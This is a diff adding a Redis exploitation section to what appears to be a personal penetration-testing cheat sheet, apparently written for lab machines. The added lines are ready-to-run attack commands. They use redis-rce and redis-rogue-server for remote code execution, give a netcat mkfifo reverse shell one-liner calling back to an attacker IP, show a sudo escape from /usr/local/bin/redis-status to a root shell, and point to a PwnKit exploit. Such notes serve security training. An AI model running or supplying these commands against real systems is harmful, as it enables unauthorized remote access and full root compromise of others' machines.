@@ -2632,9 +2632,27 @@ ls -la /bin/bash
 #uid=1000(cassie) gid=1000(cassie) euid=0(root) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
 whoami
 #Got root shell
+```
+## redis 6379, /usr/local/bin/redis-status privesc
+- In [redis-rce](https://github.com/Ridter/redis-rce) redis running on the linux machine to RCE
+- ANother way to get initial shell [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) it will give the intiall shell
+```bash
+# redis-rce
+python3 redis-rce.py -r 192.168.197.176 -p 6379 -L 192.168.45.171 -f exp_lin.so # Once we get the shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.171 1122 >/tmp/f # It allowed one command or 2 commands, then listen kali linux with netcat
+# sudo -l privileges with /usr/local/bin/redis-status privilege escalation redis
+sudo /usr/local/bin/redis-status # asking authorization keys
+strings /usr/local/bin/redis-status # Got authorization key here under Authorization Key:
+sudo /usr/local/bin/redis-status # enter the authorization key
+!/bin/bash #enter the !/bin/bash it will get root shell
+
+# redis-rogue-server
+python3 redis-rogue-server.py --rhost=192.168.197.176 --lhost=192.168.45.171 --lport=4455 # It will prompt for interactive or reverse shell go for reverse shell then
+#enter kali IP and port insten kali netcat on port
+rlwrap nc -nlvp 1234 # got the shell
+# From here try above redis-status privilege escalation redis, PWNkit(https://github.com/ly4k/PwnKit)
 
 ```
-
 
 ---
 # Post Exploitation
